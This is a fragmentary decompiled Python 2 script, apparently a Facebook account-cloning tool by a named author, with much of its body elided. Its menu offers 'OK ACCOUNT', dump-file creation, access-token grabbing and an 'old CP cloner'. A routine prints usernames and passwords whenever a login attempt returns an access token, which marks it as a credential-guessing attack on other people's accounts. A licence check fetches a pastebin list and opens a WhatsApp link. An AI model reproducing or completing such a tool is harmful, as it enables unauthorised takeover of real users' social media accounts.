...
# Embedded file name: /storage/emulated/0/Ferdous-OK.py
...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO FERDOUS HASAN ...............')
...
logo = '\x1b[1;97m--------------------------------------------\n      ---> Create to by -> FERDOUS HASAN <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Whatsapp  -> +8801892325846 \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> FACEBOOK -> www.facebook.com/remembering.404 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : FERDOUS HASAN'
    print '\x1b[1;91mFACEBOOK  : https://m.me/mimakter015'
    print '\x1b[1;91mGITHUB  : github.com/bdcyberpredators'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    print '\x1b[1;91mBANGLADESH JUS NOW OPEN ID'
    print
    print '\x1b[1;92m[1]  OK ACCOUNT (JUST NOW)'
    print '\x1b[1;92m[2]  DUMP FILE MAKE'
    print '\x1b[1;92m[3]  CONTACT ME'
    print '\x1b[1;92m[4]  GET ACCESS TOKEN'
    print '\x1b[1;92m[5]  JOIN WHATSAPP'
    print '\x1b[1;92m[6]  BD OLD CP CLONNER'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[LOCK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
...
def Token_token():
	...
	print("")
	try:
		tok = open('/sdcard/Download/.ferdous.txt', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("https://pastebin.com/raw/fr2M1t6g").text
		if dec in r:
...
def not_reg():
    ...
    v_Token_token_save = open('/sdcard/Download/.ferdous.txt', 'w')
    ...
    print("")
    raw_input("  \t  \033[1;93m Press enter to check again ")
    os.system('xdg-open https://wa.me/+8801892325846') #whatsapp number here
    Token_token()
...
if __name__ == '__main__':
    menu()
# okay decompiling Ferdous-OK.pyc
